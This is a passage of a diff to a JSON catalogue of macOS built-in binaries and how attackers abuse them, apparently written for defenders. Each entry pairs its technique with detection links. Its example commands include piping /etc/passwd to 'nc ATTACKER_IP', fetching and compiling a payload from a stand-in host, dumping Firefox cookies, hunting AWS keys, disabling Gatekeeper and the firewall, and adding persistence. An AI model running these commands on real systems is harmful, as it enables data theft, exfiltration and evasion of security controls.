+                "url": "https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/osascript_gather_clipboard"
+            },
+            {
+                "name": "Jamf Protect: Detect activity that is related to osascript pulling system information",
+                "url": "https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/osascript_gather_system_information"
+            },
+            {
+                "name": "Jamf Protect: Detect activity that is related to generating dialogs using osascript and asking for specific user input",
+                "url": "https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/osascript_dialog_activity"
+            }
+        ],
+        "resources": [
+            {
+                "name": "Using macOS Internals for Post Exploitation",
+                "url": "https://medium.com/red-teaming-with-a-blue-team-mentality/using-macos-internals-for-post-exploitation-b5faaa11e121"
+            }
+        ]
+    },
+    {
+        "name": "osacompile",
+        "author": "Brendan Chamberlain (@infosecB)",
+        "short_description": "Compile AppleScripts or OSA language scripts.",
+        "full_description": "osacompile is a utility used to compile scripts into executables. It's a component of Open Scripting Architecture (OSA) that Apple uses for its scripting languages, like AppleScript and JavaScript for Automation (JXA). osacompile accepts AppleScript code as input and produces a compiled script file, which can be either a script file (.scpt), an app (.app), a droplet, or a script bundle.",
+        "created": "2023-05-14",
+        "example_use_cases": [
+            {
+                "name": "Download and compile a payload",
+                "description": "The following command downloads an applescript payload from getpayload.com and compiles it into an app.",
+                "code": "curl https://getpayload.com/payload_code.apple_script && osacompile -x -e payload_code.apple_script -o payload.app",
+                "tactics": [
+                    "Command and Control",
+                    "Resource Development"
+                ],
+                "tags": [
+                    "XCSSET"
+                ]
+            }
+        ],
+        "paths": [
+            "/usr/bin/osacompile"
+        ],
+        "detections": [
+            {
+                "name": "Sigma: In-Memory Download And Compile Of Payloads (experimental/pending)",
+                "url": "https://github.com/SigmaHQ/sigma/pull/4127/commits/f4b0264a83e5f47473029e26dc0879fb196a7d07"
+            }
+        ],
+        "resources": [
+            {
+                "name": "A bundle of nerves: Tweaking macOS security controls to thwart application bundle manipulation",
+                "url": "https://redcanary.com/blog/mac-application-bundles/"
+            }
+        ]
+    },
+    {
+        "name": "odutil",
+        "author": "Ethan Nay",
+        "short_description": "odutil allows caller to examine or change state of opendirectoryd",
+        "full_description": "To look at internal state information for opendirectoryd, enable or disable logging, or change statistics settings.",
+        "created": "2023-07-12",
+        "example_use_cases": [
+            {
+                "name": "Listing the available node names",
+                "description": "List all available node names",
+                "code": "odutil show nodenames",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "bash",
+                    "zsh"
+                ]
+            },
+            {
+                "name": "Retrieves active session",
+                "description": "Retrieves the all active sessions",
+                "code": "odutil show sessions",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "bash",
+                    "zsh"
+                ]
+            },
+            {
+                "name": "Retrieves \"Default search policy\"",
+                "description": "Retrieves the configuration of \"Default search policy\"",
+                "code": "odutil show configuration /Search",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "bash",
+                    "zsh"
+                ]
+            },
+            {
+                "name": "Retrieves \"Contact search policy\"",
+                "description": "Retrieves the configuration of \"Contact search policy\"",
+                "code": "odutil show configuration /Contacts",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "bash",
+                    "zsh"
+                ]
+            }
+        ],
+        "paths": [
+            "/usr/bin/odutil"
+        ],
+        "detections": [
+            {
+                "name": "No detections at time of publishing",
+                "url": "N/A"
+            }
+        ],
+        "resources": [
+            {
+                "name": "macOS/binaries/odutil",
+                "url": "https://macosbin.com/bin/odutil"
+            },
+            {
+                "name": "odutil man page",
+                "url": "https://www.unix.com/man-page/osx/1/odutil/"
+            }
+        ]
+    },
+    {
+        "name": "launchctl",
+        "author": "Josh Carullo",
+        "short_description": "Interact with LaunchAgents and LaunchDaemons.",
+        "full_description": "launchctl can be used to load, start, stop, and unload macOS services. It is a command-line frontend to launchd.",
+        "created": "2023-05-27",
+        "example_use_cases": [
+            {
+                "name": "Use launchctl to execute an application",
+                "description": "A oneliner that will load a plist as a LaunchAgent or LaunchDaemon, achieving persistence on a target machine. This command requires root privileges.",
+                "code": "sudo launchctl load /Library/LaunchAgent/com.apple.installer",
+                "tactics": [
+                    "Execution",
+                    "Persistence"
+                ],
+                "tags": [
+                    "bash",
+                    "zsh",
+                    "oneliner"
+                ]
+            },
+            {
+                "name": "Persistent launch agent",
+                "description": "Creation of a persistent launch agent called with $HOME/Library/LaunchAgents/com.apple.updates.plist",
+                "code": "launchctl load -w ~/Library/LaunchAgents/com.apple.updates.plist",
+                "tactics": [
+                    "Persistence"
+                ]
+            }
+        ],
+        "paths": [
+            "/bin/launchctl"
+        ],
+        "detections": [
+            {
+                "name": "LaunchAgents and LaunchDaemons must have a plist file on disk in the root, system, or user Library directory. Monitoring for plist's with executables located in /tmp or /Shared could identify suspicious applications.",
+                "url": "N/A"
+            },
+            {
+                "name": "Jamf Protect: Detect launchctl activity that unloads or bootsout specific service",
+                "url": "https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/launchctl_unload_and_bootout_events"
+            }
+        ],
+        "resources": [
+            {
+                "name": "20 Common Tools & Techniques used by macOS threat Actors & Malware",
+                "url": "https://www.sentinelone.com/labs/20-common-tools-techniques-used-by-macos-threat-actors-malware/"
+            },
+            {
+                "name": "Mitre Attack Technique: launchctl T1569",
+                "url": "https://attack.mitre.org/techniques/T1569/001/"
+            },
+            {
+                "name": "MITRE ATT&CK T1543.001  Create or Modify System Process: Launch Agent ",
+                "url": "https://attack.mitre.org/techniques/T1543/001/"
+            },
+            {
+                "name": "Komplex OS X Trojan (Sofacy)",
+                "url": "https://unit42.paloaltonetworks.com/unit42-sofacys-komplex-os-x-trojan/"
+            }
+        ]
+    },
+    {
+        "name": "ditto",
+        "author": "Brendan Chamberlain (@infosecB)",
+        "short_description": "Copy files and directories while preserving file attributes and permissions.",
+        "full_description": "ditto is a command line utility that is commonly used to copy files and directories while preserving file attributes and permissions. The tool can be used by malicious actors to collect and exfiltrate sensitive data, move laterally, and/or perform DLL hijacking or binary replacement attacks.",
+        "created": "2023-05-04",
+        "example_use_cases": [
+            {
+                "name": "Copy and compress sensitive data locally",
+                "description": "The following command gathers and compresses (-c) files from the specified folder and writes them to a zip (-k) file.",
+                "code": "ditto -c -k --sequesterRsrc --keepParent /home/user/sensitive-files /tmp/l00t.zip",
+                "tactics": [
+                    "Collection",
+                    "Exfiltration"
+                ],
+                "tags": [
+                    "files",
+                    "compress",
+                    "recursive"
+                ]
+            },
+            {
+                "name": "Remove extended attributes from a file",
+                "description": "ditto can be used to bypass Gatekeeper by removing the \"com.apple.quarantine\" extended attribute.",
+                "code": "ditto -c -k unsigned.app app.zip ditto -x -k app.zip unsigned.app 2>/dev/null",
+                "tactics": [
+                    "Collection",
+                    "Exfiltration"
+                ],
+                "tags": [
+                    "files",
+                    "compress",
+                    "recursive"
+                ]
+            },
+            {
+                "name": "Copy, compress, and transfer sensitive data to a remote macOS host",
+                "description": "The following command gathers and compresses (-c) files from the specified folder and writes them to a zip (-k) file.",
+                "code": "ditto -c --norsrc /home/user/sensitive-files - | ssh remote_host ditto -x --norsrc - /home/user/l00t",
+                "tactics": [
+                    "Collection",
+                    "Exfiltration",
+                    "Lateral Movement",
+                    "Defense Evasion"
+                ],
+                "tags": [
+                    "files"
+                ]
+            },
+            {
+                "name": "DLL hjiacking",
+                "description": "Replace a legitimate library with a malicious one while maintaining the original file permissions and attributes.",
+                "code": "ditto -V /path/to/malicious-library/malicious_library.dylib /path/to/target-library/original_library.dylib",
+                "tactics": [
+                    "Persistence"
+                ],
+                "tags": [
+                    "files"
+                ]
+            }
+        ],
+        "paths": [
+            "/usr/bin/ditto"
+        ],
+        "detections": [
+            {
+                "name": "No detection content at time of writing",
+                "url": "N/A"
+            }
+        ],
+        "resources": [
+            {
+                "name": "ditto man page",
+                "url": "https://ss64.com/osx/ditto.html"
+            },
+            {
+                "name": "Gatekeeper’s Achilles heel: Unearthing a macOS vulnerability",
+                "url": "https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/"
+            },
+            {
+                "name": "Jamf Threat Labs identifies Safari vulnerability allowing for Gatekeeper bypass",
+                "url": "https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/"
+            }
+        ]
+    },
+    {
+        "name": "defaults",
+        "author": "Brendan Chamberlain (@infosecB)",
+        "short_description": "Read, write, and delete user preference values.",
+        "full_description": "The defaults binary is normally used to interact with the user defaults system, a database of macOS used to manage system settings much like the Windows Registry. The database can be abused by threat actors to change settings in attempt to evade defenses or to gain persistence.",
+        "created": "2023-05-24",
+        "example_use_cases": [
+            {
+                "name": "Disable Gatekeeper's auto rearm functionality",
+                "description": "The following command can be used to disable Gatekeepers rearm functionality. This command requires root privileges.",
+                "code": "sudo defaults write /Library/Preferences/com.apple.security GKAutoRearm -bool NO",
+                "tactics": [
+                    "Defense Evasion"
+                ],
+                "tags": [
+                    "gatekeeper"
+                ]
+            },
+            {
+                "name": "Show mounted servers",
+                "description": "Show all mounted servers on the desktop.",
+                "code": "defaults read com.apple.finder \"ShowMountedServersOnDesktop\"",
+                "tactics": [
+                    "Discovery"
+                ]
+            },
+            {
+                "name": "Add a login item to the current user",
+                "description": "An attacker can use defaults to add a login hook in attempt to gain persistence. This command requires root privileges.",
+                "code": "sudo defaults write /Library/Preferences/com.apple.loginwindow LoginHook gain_persistence.sh",
+                "tactics": [
+                    "Persistence"
+                ]
+            },
+            {
+                "name": "Get Active Directory user info from Jamf Connect",
+                "description": "Retrieve Active Directory user info from Jamf Connect defaults configuration.",
+                "code": "defaults read com.jamf.connect.state",
+                "tactics": [
+                    "Discovery"
+                ]
+            },
+            {
+                "name": "Enable Firewall",
+                "description": "Enables macOS' default firewall. This command requires root privileges.",
+                "code": "sudo defaults write /Library/Preferences/com.apple.alf globalstate -int 1",
+                "tactics": [
+                    "Defense Evasion"
+                ],
+                "tags": [
+                    "firewall"
+                ]
+            },
+            {
+                "name": "Disable Firewall",
+                "description": "Disables macOS' default firewall. This command requires root privileges.",
+                "code": "sudo defaults write /Library/Preferences/com.apple.alf globalstate -int 0",
+                "tactics": [
+                    "Defense Evasion"
+                ],
+                "tags": [
+                    "firewall"
+                ]
+            }
+        ],
+        "paths": [
+            "/usr/bin/defaults"
+        ],
+        "detections": [
+            {
+                "name": "No detections at time of publishing",
+                "url": "N/A"
+            }
+        ],
+        "resources": [
+            {
+                "name": "macOS defaults list: Uncomplete list of macOS defaults commands with demos",
+                "url": "https://macos-defaults.com/"
+            },
+            {
+                "name": "Insistence on Persistence",
+                "url": "https://www.huntress.com/blog/insistence-on-persistence"
+            }
+        ]
+    },
+    {
+        "name": "hdiutil",
+        "author": "Mark Morowczynsk (@markmorow)",
+        "short_description": "Manipulate disk images using the DiskImages framework.",
+        "full_description": "hdiutil manipulates disk images such as DMG and ISO files. You can mount, unmount, create, resize and verify disk images. Including encrypted images.",
+        "created": "2023-05-21",
+        "example_use_cases": [
+            {
+                "name": "Mount a malicious dmg file",
+                "description": "Uses hdiutil to mount a malicious dmg file to",
+                "code": "hdiutil mount malicious.dmg",
+                "tactics": [
+                    "Execution"
+                ],
+                "tags": [
+                    "bash",
+                    "zsh",
+                    "disk"
+                ]
+            },
+            {
+                "name": "Mount a malicious dmg file",
+                "description": "Uses hdiutil to mount a malicious dmg file to",
+                "code": "hdiutil attach malicious.dmg",
+                "tactics": [
+                    "Execution"
+                ],
+                "tags": [
+                    "bash",
+                    "zsh",
+                    "disk"
+                ]
+            },
+            {
+                "name": "Mount a malicious iso file",
+                "description": "Uses hdiutil to mount a malicious iso file to",
+                "code": "hdiutil mount malicious.iso",
+                "tactics": [
+                    "Execution"
+                ],
+                "tags": [
+                    "bash",
+                    "zsh",
+                    "disk"
+                ]
+            },
+            {
+                "name": "Mount a malicious iso file",
+                "description": "Uses hdiutil to mount a malicious iso file to",
+                "code": "hdiutil attach malicious.iso",
+                "tactics": [
+                    "Execution"
+                ],
+                "tags": [
+                    "bash",
+                    "zsh",
+                    "disk"
+                ]
+            },
+            {
+                "name": "Exfiltrate data in dmg file",
+                "description": "Uses hdiutil to create a dmg file to store exfiltrate data",
+                "code": "hdiutil create -volname \"Volume Name\" -srcfolder /path/to/folder -ov diskimage.dmg",
+                "tactics": [
+                    "Collection"
+                ],
+                "tags": [
+                    "bash",
+                    "zsh",
+                    "disk"
+                ]
+            },
+            {
+                "name": "Exfiltrate data in encrypted dmg file",
+                "description": "Uses hdiutil to create a dmg file to store exfiltrate data",
+                "code": "hdiutil create -encryption -stdinpass -volname \"Volume Name\" -srcfolder /path/to/folder -ov encrypteddiskimage.dmg",
+                "tactics": [
+                    "Collection"
+                ],
+                "tags": [
+                    "bash",
+                    "zsh",
+                    "disk"
+                ]
+            }
+        ],
+        "paths": [
+            "/usr/bin/hdiutil"
+        ],
+        "detections": [
+            {
+                "name": "Sigma: Disk Image Mounting Via Hdiutil",
+                "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_hdiutil_mount.yml"
+            },
+            {
+                "name": "Sigma: Disk Image Creation Via Hdiutil",
+                "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_hdiutil_create.yml"
+            }
+        ],
+        "resources": [
+            {
+                "name": "Microsoft finds new macOS vulnerability, Shrootless, that could bypass System Integrity Protection",
+                "url": "https://www.microsoft.com/en-us/security/blog/2021/10/28/microsoft-finds-new-macos-vulnerability-shrootless-that-could-bypass-system-integrity-protection/"
+            }
+        ]
+    },
+    {
+        "name": "mdfind",
+        "author": "Chris Campbell (@texasbe2trill)",
+        "short_description": "Locate files using the Spotlight database.",
+        "full_description": "mdfind to locate files on MacOS by searching a pre-built database. It is a command-line alternative to Spotlight in MacOS",
+        "created": "2023-04-22",
+        "example_use_cases": [
+            {
+                "name": "Use mdfind to provide live updates to the number of files matching the query",
+                "description": "A bash or zsh oneliner can cause mdfind to provide an attacker with live updates to the number of files on a system.",
+                "code": "mdfind -live passw",
+                "tactics": [
+                    "Reconnaissance",
+                    "Discovery"
+                ],
+                "tags": [
+                    "bash",
+                    "zsh",
+                    "oneliner"
+                ]
+            },
+            {
+                "name": "Use mdfind to search for AWS Keys",
+                "description": "Allows an attacker to query the filesystem via the CommandLine/Terminal to search for AWS keys.",
+                "code": "mdfind 'kMDItemTextContext == AKIA || kMDItemDisplayName = *AKIA* -onlyin ~'",
+                "tactics": [
+                    "Reconnaissance",
+                    "Discovery"
+                ],
+                "tags": [
+                    "bash",
+                    "zsh",
+                    "oneliner"
+                ]
+            },
+            {
+                "name": "Use mdfind to search for apps to infect",
+                "description": "Allows an attacker to determine if specific applications are installed and can be leveraged",
+                "code": "set appId to do shell script \"mdfind kMDItemCFBundleIdentifier = '\" & bundleId & \"'\"",
+                "tactics": [
+                    "Reconnaissance",
+                    "Discovery",
+                    "Defense Evasion"
+                ],
+                "tags": [
+                    "osascript",
+                    "XCSSET"
+                ]
+            }
+        ],
+        "paths": [
+            "/usr/bin/mdfind"
+        ],
+        "detections": [
+            {
+                "name": "Jamf Protect: Detect activity related to mdfind used to search for stored AWS keys",
+                "url": "https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/mdfind_search_aws_keys"
+            }
+        ],
+        "resources": [
+            {
+                "name": "\"Farming The Apple Orchards: Living off the Land Techniques\" - Chris Ross & Cedric Owens",
+                "url": "https://youtu.be/Snwh4mMe-Cg?t=45"
+            },
+            {
+                "name": "\"Zero-Day TCC bypass discovered in XCSSET malware\" - Jaron Bradley, Ferdous Saljooki, Stuart Ashenbrenner",
+                "url": "https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/"
+            }
+        ]
+    },
+    {
+        "name": "chflags",
+        "author": "demonduck",
+        "short_description": "Changes file or directory flags",
+        "full_description": "The chflags utility modifies the file flags of the listed files as \nspecified by the flags operand.",
+        "created": "2024-07-25",
+        "example_use_cases": [
+            {
+                "name": "Hide a file",
+                "description": "Add the hidden flag to a file or directory to prevent it from being \nvisible in Finder and Terminal.",
+                "code": "chflags hidden ~/evil",
+                "tactics": [
+                    "Defense Evasion"
+                ],
+                "tags": [
+                    "finder"
+                ]
+            },
+            {
+                "name": "Remove hidden flag",
+                "description": "Remove the hidden flag to a file or directory to make it visible in Finder\nand Terminal.",
+                "code": "chflags nohidden ~/evil",
+                "tactics": [
+                    "Defense Evasion"
+                ],
+                "tags": [
+                    "finder"
+                ]
+            }
+        ],
+        "paths": [
+            "/usr/bin/chflags"
+        ],
+        "detections": [
+            {
+                "name": "Sigma: Hidden Flag Set On File/Directory Via Chflags",
+                "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_chflags_hidden_flag.yml"
+            }
+        ],
+        "resources": [
+            {
+                "name": "chflags man page",
+                "url": "https://ss64.com/mac/chflags.html"
+            },
+            {
+                "name": "macOS/binaries/chflags",
+                "url": "https://macosbin.com/bin/chflags"
+            },
+            {
+                "name": "How to hide files and folders",
+                "url": "https://eclecticlight.co/2024/07/03/how-to-hide-files-and-folders/"
+            }
+        ]
+    },
+    {
+        "name": "dsexport",
+        "author": "Brendan Chamberlain (@infosecB)",
+        "short_description": "Export data from an Open Directory directory services server.",
+        "full_description": "dsexport is a command-line utility designed to export records from the directory services database on a local host or from a connected LDAP service. The tool can be used to gather information about users, groups, and computers. The tool can also be used to export the directory services database to a file for offline analysis.",
+        "created": "2023-05-23",
+        "example_use_cases": [
+            {
+                "name": "Export local host users",
+                "description": "Export the local host user information to a file",
+                "code": "dsexport local_users.txt /Local/Default dsRecTypeStandard:Users",
+                "tactics": [
+                    "Reconnaissance",
+                    "Discovery"
+                ],
+                "tags": [
+                    "ldap",
+                    "users"
+                ]
+            },
+            {
+                "name": "Export local host groups",
+                "description": "Export the local host group information to a file",
+                "code": "dsexport local_groups.txt /Local/Default dsRecTypeStandard:Groups",
+                "tactics": [
+                    "Reconnaissance",
+                    "Discovery"
+                ],
+                "tags": [
+                    "ldap",
+                    "groups"
+                ]
+            }
+        ],
+        "paths": [
+            "/usr/bin/dsexport"
+        ],
+        "detections": [
+            {
+                "name": "No detections at time of publishing",
+                "url": "N/A"
+            }
+        ]
+    },
+    {
+        "name": "streamzip",
+        "author": "Gabriel De Jesus (0xv1n)",
+        "short_description": "File-less compression of data passed in through stdin.",
+        "full_description": "streamzip is a system utility that can be utilized to compress data from \"stdin\" and write the data directly to \"stdout\", no temporary files are created. The tool can be used by malicious actors to collect and exfiltrate sensitive data without leaving staged data archive artifacts on disk.",
+        "created": "2024-07-15",
+        "example_use_cases": [
+            {
+                "name": "Copy and compress sensitive data locally",
+                "description": "The following command reads file data and compresses the data for exfiltration",
+                "code": "dd if=/etc/passwd | streamzip - stream | nc ATTACKER_IP PORT",
+                "tactics": [
+                    "Collection",
+                    "Exfiltration"
+                ],
+                "tags": [
+                    "files",
+                    "compress"
+                ]
+            }
+        ],
+        "paths": [
+            "/usr/bin/streamzip"
+        ],
+        "detections": [
+            {
+                "name": "No detection content at time of writing",
+                "url": "N/A"
+            }
+        ],
+        "resources": [
+            {
+                "name": "streamzip man page",
+                "url": "https://docs.oracle.com/cd/E88353_01/html/E37839/streamzip-1.html"
+            }
+        ]
+    },
+    {
+        "name": "lsregister",
+        "author": "Brendan Chamberlain (@infosecB)",
+        "short_description": "Interact with the macOS Launch Services database.",
+        "full_description": "lsregister is used to build, dump, and check the validity of the Launch Services database. This database is often abused to create custom URL scheme handlers that point to malicious apps.",
+        "created": "2023-05-15",
+        "example_use_cases": [
+            {
+                "name": "Force an update of the Launch Services database",
+                "description": "The -f flag can be used to force an update of the Launch Services database. This can be used to quickly register a custom URL scheme that points to a malicious app.",
+                "code": "/System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/LaunchServices.framework/Versions/A/Support/lsregister -f",
+                "tactics": [
+                    "Discovery"
+                ]
+            },
+            {
+                "name": "Get a list of apps and their bindings",
+                "description": "The -dump flag can be used to get a list of apps and their bindings",
+                "code": "/System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/LaunchServices.framework/Versions/A/Support/lsregister -dump | grep -E \"path:|bindings:|name: | more\"",
+                "tactics": [
+                    "Discovery"
+                ]
+            },
+            {
+                "name": "Delete the Launch Services database",
+                "description": "The -delete flag can be used to delete the Launch Services database to impact normal operation of the system.",
+                "code": "lsregister -delete",
+                "tactics": [
+                    "Impact"
+                ]
+            }
+        ],
+        "paths": [
+            "/System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/LaunchServices.framework/Versions/A/Support/lsregister"
+        ],
+        "detections": [
+            {
+                "name": "No detections at time of publishing",
+                "url": "N/A"
+            }
+        ],
+        "resources": [
+            {
+                "name": "Remote Mac Exploitation Via Custom URL Schemes",
+                "url": "https://www.jamf.com/blog/remote-mac-exploitation-via-custom-url-schemes/"
+            },
+            {
+                "name": "macOS Security & Privilege Escalation",
+                "url": "https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation"
+            }
+        ],
+        "acknowledgements": [
+            "Patrick Wardle (@patrickwardle)"
+        ]
+    },
+    {
+        "name": "last",
+        "author": "Will Huang (@In0de_16)",
+        "short_description": "Show last user logins and TTYs.",
+        "full_description": "The command shows a list of user sessions including the user name, terminal used, host name, start and stop times, and duration. It also indicates if a session is still active or was terminated unexpectedly.",
+        "created": "2023-04-27",
+        "example_use_cases": [
+            {
+                "name": "Enumerate the users who are currently logged into the system.",
+                "description": "The following command will display sessions that are currently active.",
+                "code": "last | grep \"still logged in\"",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "oneliner",
+                    "account"
+                ]
+            },
+            {
+                "name": "Enumerate all user accounts that have logged into the system previously.",
+                "description": "The last command can be used to output users who have previously logged in, by specifying the tty interface 'console'.",
+                "code": "last -t console",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "oneliner",
+                    "account"
+                ]
+            },
+            {
+                "name": "Enumerate all hosts that have remotely logged into the system before.",
+                "description": "An attacker can use 'last' with a filter to retrieve the connection date and remote host information for remote logins.",
+                "code": "last | grep -E '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+'",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "oneliner",
+                    "network"
+                ]
+            }
+        ],
+        "paths": [
+            "/usr/bin/last"
+        ],
+        "detections": [
+            {
+                "name": "System Network Connections Discovery",
+                "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_system_network_connections_discovery.yml"
+            }
+        ],
+        "resources": [
+            {
+                "name": "last Man Page",
+                "url": "https://ss64.com/osx/last.html"
+            }
+        ]
+    },
+    {
+        "name": "sqlite3",
+        "author": "Brendan Chamberlain (@infosecB)",
+        "short_description": "Query and manage sqlite databases.",
+        "full_description": "sqlite is a command-line utility that allows users to query and manage sqlite databases. Many components of macOS and apps used sqlite to store data. Attackers can leverage this tool to discover sensitive data.",
+        "created": "2023-05-23",
+        "example_use_cases": [
+            {
+                "name": "Get apps with Full Disk access",
+                "description": "The following command interacts with the TCC (Transparency, Consent, and Control) database to show the apps that have Full Disk access permission",
+                "code": "sqlite3 /Library/Application\\ Support/com.apple.TCC/TCC.db \\\n'select client from access where auth_value and service = \"kTCCServiceSystemPolicyAllFiles\"'",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "permissions"
+                ]
+            },
+            {
+                "name": "Get Firefox cookie data",
+                "description": "The following one-liner can be used to kill Firefox and dump cookie data from the user's Firefox profile.",
+                "code": "killall firefox; find ~/Library/Application\\ Support/Firefox/Profiles/. | grep cookies.sqlite | xargs -I {} sqlite3 {} \"select * from moz_cookies\"",
+                "tactics": [
+                    "Collection",
+                    "Credential Access"
+                ],
+                "tags": [
+                    "oneliner",
+                    "cookie-theft"
+                ]
+            },
+            {
+                "name": "View URL associated with file downloads",
+                "description": "The following sqlite command is commonly used by macOS malware to view the URL in which the payload was downloaded from.",
+                "code": "sqlite3 ~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV* 'select LSQuarantineDataURLString from LSQuarantineEvent'",
+                "tactics": [
+                    "Collection",
+                    "Credential Access"
+                ],
+                "tags": [
+                    "oneliner",
+                    "cookie-theft"
+                ]
+            }
+        ],
+        "paths": [
+            "/usr/bin/sqlite3"
+        ],
+        "detections": [
+            {
+                "name": "Elastic Detection Rules: Potential Privacy Control Bypass via TCCDB Modification",
+                "url": "https://github.com/elastic/detection-rules/blob/e9baebc2bc18f90ae16501613cd9521a16a38ad7/rules/macos/defense_evasion_privacy_controls_tcc_database_modification.toml"
+            },
+            {
+                "name": "Splunk Security Content: Suspicious SQLite3 LSQuarantine Behavior",
+                "url": "https://github.com/splunk/security_content/blob/c65dda5c0aa73a97f28c49c20739971ec1ba18a6/dev/endpoint/suspicious_sqlite3_lsquarantine_behavior.yml#L2"
+            },
+            {
+                "name": "Jamf Protect: Detect SQLite3 activity used to associated URLs with downloaded files",
+                "url": "https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/sqlite3_downloads"
+            }
+        ],
+        "resources": [
+            {
+                "name": "TCC.db Modifier Script",
+                "url": "https://github.com/bp88/JSS-Scripts/blob/master/TCC.db%20Modifier.sh"
+            },
+            {
+                "name": "Clipping Silver Sparrow’s wings: Outing macOS malware before it takes flight",
+                "url": "https://redcanary.com/blog/clipping-silver-sparrows-wings/"
+            }
+        ]
+    },
+    {
+        "name": "profiles",
+        "author": "Will Huang (@In0de_16)",
+        "short_description": "List and remove configuration profiles.",
+        "full_description": "Profiles on macOS are responsible for managing different types of profiles including configuration, provisioning, bootstraptoken, or enrollment. However, starting from macOS 11.0, this tool cannot be used for installing configuration profiles.",
+        "created": "2023-05-16",
+        "example_use_cases": [
+            {
+                "name": "Collect system DEP information.",
+                "description": "The following command determines whether device is DEP(Device Enrolment Program) enabled and output the DEP information.",
+                "code": "sudo profiles show -type enrollment",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "oneliner"
+                ]
+            },
+            {
+                "name": "Remove configuration profiles.",
+                "description": "The following command deletes the specified profiles. An optional password used when removing a configuration profile which requires the password removal option.",
+                "code": "profiles remove -identifier com.profile.identifier -password <password>",
+                "tactics": [
+                    "Impact"
+                ],
+                "tags": [
+                    "oneliner"
+                ]
+            }
+        ],
+        "paths": [
+            "/usr/bin/profiles"
+        ],
+        "detections": [
+            {
+                "name": "No detections at time of publishing.",
+                "url": "N/A"
+            }
+        ],
+        "resources": [
+            {
+                "name": "macOS MDM introduction.",
+                "url": "https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation/macos-mdm"
+            }
+        ]
+    },
+    {
+        "name": "system_profiler",
+        "author": "Ethan Nay",
+        "short_description": "Reports system hardware and software configuration.",
+        "full_description": "system_profiler reports on the hardware and software configuration of the system. It can generate plain text reports or XML reports which can be opened with System Information.app",
+        "created": "2023-07-12",
+        "example_use_cases": [
+            {
+                "name": "Listing the available datatypes",
+                "description": "List all available sub-systems to get information from.",
+                "code": "system_profiler -listDataTypes",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "bash",
+                    "zsh"
+                ]
+            },
+            {
+                "name": "Print hardware information",
+                "description": "Prints an overview of the hardware of the current machine, including its model name and serial number.",
+                "code": "system_profiler SPHardwareDataType",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "bash",
+                    "zsh"
+                ]
+            },
+            {
+                "name": "Print software information",
+                "description": "Prints an overview of the software of the current machine, including the exact macOS version number.",
+                "code": "system_profiler SPSoftwareDataType",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "bash",
+                    "zsh"
+                ]
+            },
+            {
+                "name": "Print the information of developer tools",
+                "description": "Prints the currently active version of the Xcode developer tools and SDK.",
+                "code": "system_profiler SPDeveloperToolsDataType",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "bash",
+                    "zsh"
+                ]
+            },
+            {
+                "name": "Print power and battery information",
+                "description": "Prints power and battery information, including the current AC wattage and battery cycle count.",
+                "code": "system_profiler SPPowerDataType",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "bash",
+                    "zsh"
+                ]
+            }
+        ],
+        "paths": [
+            "/usr/sbin/system_profiler"
+        ],
+        "detections": [
+            {
+                "name": "System Information Discovery Using System_Profiler",
+                "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_system_profiler_discovery.yml"
+            },
+            {
+                "name": "Jamf Protect: Detect system_profiler activity that gathers system information",
+                "url": "https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/system_profiler_activity"
+            }
+        ],
+        "resources": [
+            {
+                "name": "macOS/binaries/system_profiler",
+                "url": "https://macosbin.com/bin/system_profiler"
+            },
+            {
+                "name": "system_profiler man page",
+                "url": "https://ss64.com/osx/system_profiler.html"
+            }
+        ]
+    },
+    {
+        "name": "screencapture",
+        "author": "Brendan Chamberlain (@infosecB)",
+        "short_description": "Capture a screenshot from command line.",
+        "full_description": "A tools that allows users to take screenshots of their desktop or specific app windows. The tool can be used by malicious actors to collect sensitve information from the targeted system.",
+        "created": "2023-04-27",
+        "example_use_cases": [
+            {
+                "name": "Continously capture screenshots",
+                "description": "The following command demonstrates how an attacker can use the tool to capture screenshots every 10 seconds. The -x flag prevents snapshot sounds from being played.",
+                "code": "while true; do ts=$(date +\"%Y%m%d-%H%M%S\"); o=\"/tmp/screenshots\"; screencapture -x \"$o/ss-$ts.png\"; sleep 10; done",
+                "tactics": [
+                    "Collection"
+                ],
+                "tags": [
+                    "oneliner"
+                ]
+            }
+        ],
+        "paths": [
+            "/usr/sbin/screencapture"
+        ],
